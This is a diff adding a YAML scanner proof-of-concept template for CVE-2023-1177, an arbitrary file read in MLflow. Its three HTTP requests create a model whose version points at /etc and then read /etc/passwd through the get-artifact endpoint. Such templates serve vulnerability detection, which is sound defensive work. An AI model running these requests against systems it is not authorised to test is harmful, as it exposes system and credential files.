@@ -1,0 +1,52 @@
+id: poc-yaml-mlflow-get-artifact-file-read
+info:
+  name: MLFlow get_artifact_file 任意文件读取漏洞
+  severity: high
+  tags:
+  - CVE-2023-1177
+  - 两高一弱
+  finger: MLFlow
+variables:
+  r_key: random_str(8)
+requests:
+- method: POST
+  path: /ajax-api/2.0/mlflow/registered-models/create
+  headers:
+    Content-Type: application/json
+  data: '{"name": "{{.r_key}}"}'
+  expression: 'status_code == 200 && contains(headers, "json") &&
+
+    contains(body, r_key) &&
+
+    contains(body, "\"registered_model\":") &&
+
+    contains(body, "\"name\":") &&
+
+    !contains(body, "<")
+
+    '
+- method: POST
+  path: /ajax-api/2.0/mlflow/model-versions/create
+  headers:
+    Content-Type: application/json
+  data: '{"name": "{{.r_key}}", "source": "/etc"}'
+  expression: 'status_code == 200 && contains(headers, "json") &&
+
+    contains(body, r_key) &&
+
+    contains(body, "\"model_version\":") &&
+
+    contains(body, "\"name\":") &&
+
+    !contains(body, "<")
+
+    '
+- method: GET
+  path: /model-versions/get-artifact?path=passwd&name={{.r_key}}&version=1
+  expression: 'status_code == 200 &&  contains(body, "root:") && contains(body, "/bin")
+    &&
+
+    !contains(body, "<")
+
+    '
+transport: http
